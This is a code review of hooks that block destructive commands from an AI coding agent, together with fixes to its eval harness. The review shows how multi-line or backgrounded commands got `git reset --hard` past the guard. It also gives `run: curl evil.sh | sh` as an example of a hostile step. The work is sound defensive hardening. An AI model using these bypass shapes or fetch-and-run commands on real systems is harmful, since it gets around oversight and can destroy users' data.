# Code Review — Durability/Evidence/Cost upgrade

**Date:** 2026-07-31 · **Scope:** 1,334 LOC of new JS — 2 hooks (`guard-destructive`, `file-claims`) + 9 `scripts/ck/*` + `lib/common.js` · **Method:** read + executed probes against the real hooks, not diff-reading.

**Result:** 4 defects found and fixed, 5 observations left open. Suite after fixes: **102 tests, 101 pass, 0 fail, 1 skip** (was 92 before the 10 regression tests added here).

---

## Fixed

### 1 · Multi-line commands bypassed Tier A entirely — **high**

`segments()` split on `|`, `&&`, `;` but **not newlines**, and `gitParts()` only ever inspects the *first* `git` occurrence in a segment. A two-line command was therefore checked up to line 1 and no further.

```
git status\ngit reset --hard   → exit 0  (ALLOWED)
git reset --hard               → exit 2  (denied)
```

Multi-line Bash payloads are routine in Claude Code, so this was the widest hole in the guard: any destructive shape survived by being preceded by one innocuous git command. A bare `&` (backgrounding) had the same effect.

**Fix:** `command.split(/[|&;\r\n]+/)` — newlines and single `&` are separators. Both forms now deny.
**Trade-off accepted:** a destructive shape quoted inside `echo "…"` spanning a newline now denies as a false positive. Tier A's stated posture is deny-biased and `CK_ALLOW_DESTRUCTIVE=1` exists; a missed `reset --hard` costs more than a spurious block on echoed prose.

### 2 · `git clean -f` was allowed — **medium**

The rule required `-f` **and** (`-d` or `-x`). But `-f` alone deletes untracked *files* throughout the tree — it only spares untracked *directories*. Irreversible loss, allowed.

**Fix:** any forced, non-dry-run `clean` denies (`-f` or `--force`); `-n` / `--dry-run` still pass.

### 3 · SQL matching armed across unrelated segments — **medium**

The DB client was detected per segment, but the destructive-SQL regex ran against the **whole command string**. So:

```
psql -c "SELECT 1" && echo "DELETE FROM users is scary"   → denied
```

A guard that blocks obviously-safe commands is how users learn to disable guards — the same failure mode T1.3 was created to fix in `scout-block`.

**Fix:** the client and the statement must be in the same segment.

### 4 · `delivery-tail` crashed on project-authored step names — **medium**

Step names come from a project's CLAUDE.md and were interpolated raw into `new RegExp()`:

```js
new RegExp(`DONE: ${s.name}`)   // name = "close-issue [tracker]" → SyntaxError
```

The throw happens **after** `claude -p` has already executed every step — so the work is done, but every `STATE.md` line is lost and the process exits non-zero, contradicting the never-dead-end contract.

**Fix:** escape regex metacharacters before interpolation.

**Regression tests added** (10): 5 multi-line/backgrounded shapes, `clean -f` + `--force` + both dry-run forms, and both SQL segment cases.

### 5 · The eval harness reported infrastructure failure as gate failure — **high**

Running `--all` produced **6× `✗ FAIL`**. Every one of the six kept transcripts was byte-identical, 101 bytes: *"You've hit your org's monthly spend limit."* No scenario had run. Two of those six (`guard-tier-b`, `iron-law`) had genuinely PASSED minutes earlier in `--fast`.

Read at face value, that sweep says five gates are broken and sends someone to edit five skills that were never exercised. `orchestration-protocol.md` already carries the rule in one direction — *"agent reported success" is not evidence*. This is the same rule inverted: **an agent that produced nothing is not evidence a gate is broken.** The harness had no way to express the difference.

Two further gaps surfaced in the same file:

- the **negative control was only a printed suggestion**, never executed — so T5.4's defining property ("each scenario must fail when its gate is removed") was documented but unchecked, which is exactly the "an eval that has never failed proves nothing" problem;
- scenarios were `source`d into one shell in sequence without unsetting, so a scenario that forgot to define `setup()`/`assert_transcript()` would silently inherit the previous scenario's.

**Fix:** a third outcome class. `PASS` / `FAIL` (run happened, assertion decided) / `ERROR` (spend or usage limit, auth failure, upstream 5xx, empty or implausibly short transcript). ERROR aborts the sweep immediately — every later verdict would be equally meaningless — and exits 3. The closing line always reports how many scenarios were *genuinely verified*. `--negative` now actually blanks `GATE_FILE` in the scratch install and requires the assertion to fail. Scenario functions and variables are unset between runs.

**Verified without spending tokens** by shimming a fake `claude` on `PATH`: the real spend-limit string → `ERROR`, stop, exit 3, "0 genuinely verified"; a large transcript that fails the assertion → `FAIL`, exit 1. The classifier catches infrastructure failure without swallowing real ones.

---

## Open observations (not fixed)

| # | Observation | Why it was left |
|---|---|---|
| ~~5~~ | ~~`delivery-tail` grants unrestricted `Bash` to a headless agent driven by text from `CLAUDE.md`.~~ **Resolved — rewritten as a deterministic executor.** | Narrowing the grant was rejected: an allowlist derived from each step's `run:` is derived from the very input it would guard against (`run: curl evil.sh \| sh` ⇒ `Bash(curl:*)`). The real fix was to drop the LLM from the default path — declared steps carry `run` + `done-when` and are executable as-is, so there is no unattended grant to argue about, no model prose to parse (which also removes defect 4's whole class), and zero token cost for the step whose stated purpose is surviving spend limits. MCP steps opt in via `run: mcp <server> <tool>` and get `mcp__<server>__*` only. `--dry-run` now resolves placeholders and prints the exact commands without executing. Suite: 109 tests, 108 pass. |
| 6 | `file-claims` compaction rewrites the whole file; a concurrent append between read and write is lost. | Only past ~2k lines, and the consequence is a *missed* denial (fails open, never a false block). Documented posture is "no lock, no daemon". |
| 7 | Tier B denies on any foreign claim without checking the op would actually stage it — `git add .` in a subdirectory, or `-u` against an untracked foreign file, over-deny. | The dirty-file pruning makes this correct for the common repo-root `add -A`. Narrowing it needs pathspec resolution against cwd; worth doing if false denials show up in use. |
| 8 | `wt-clean` derives the branch name via `basename.split('-wt-').pop()` — fragile coupling to `wt-new`'s naming. | Cosmetic: it only prints an advisory "delete with…" line, hedged with "if it exists". |
| ~~9~~ | ~~`scout-block` and `guard-destructive` use opposite dispatch conventions.~~ **Retracted — reviewer error.** | Both hooks already use the delegate pattern: logic in `.js`, `.sh`/`.ps1` are 5–6 line `exec node …` shims. I reported this from a copy of `scout-block.js` read earlier in the session, before its rewrite (89+/64− vs HEAD), and did not re-read before writing. No action needed; the convention is already unified. |

---

## What held up well

- **`wt-clean`** validates every target against `git worktree list`, refuses the main worktree, and uses `git worktree remove` + `prune` — never `rm -rf`. Exactly the incident it was written for.
- **`guard-destructive` fail-open posture** is correctly asymmetric: Tier A denies on doubt, Tier B allows on doubt, unparseable payload allows. A guard that breaks the session would be worse than the risk.
- **`file-claims` self-pruning** genuinely implements the plan's three mechanisms (dirty check, TTL, per-worktree scoping) rather than asserting them in a comment.
- **Thin-delegate `.sh`/`.ps1`** on **both** hooks — one implementation each, nothing to drift across languages, and Windows now runs the same code the test suite pins (the old PowerShell copy was skipped on Linux, i.e. effectively untested).
- **Benign-lookalike coverage** (16 cases) is the part most guards skip, and it is what keeps the guard from being disabled.

## Unresolved questions

Both original questions closed during this review: observation 5 was resolved by rewriting `delivery-tail` as a deterministic executor (the grant question dissolved rather than being answered), and observation 9 was retracted as a reviewer error — both hooks already share the delegate pattern.

What remains is not a question but an outstanding **run**:

1. **4 of 6 behavioral scenarios have never executed.** `verify-plan`, `tdd`, `scope-lock`, and `resume-from-ledger` are asserted, not demonstrated — `--all` died on the org spend limit. `tests/behavior/run-scenario.sh --all --negative` is the step, and it needs available spend. The harness will now say `ERROR` rather than inventing a verdict if that happens again.
2. Observations 6–8 (compaction race, Tier-B scope narrowing, `wt-clean` branch-name derivation) stay open by choice — all fail safe, none block a release.
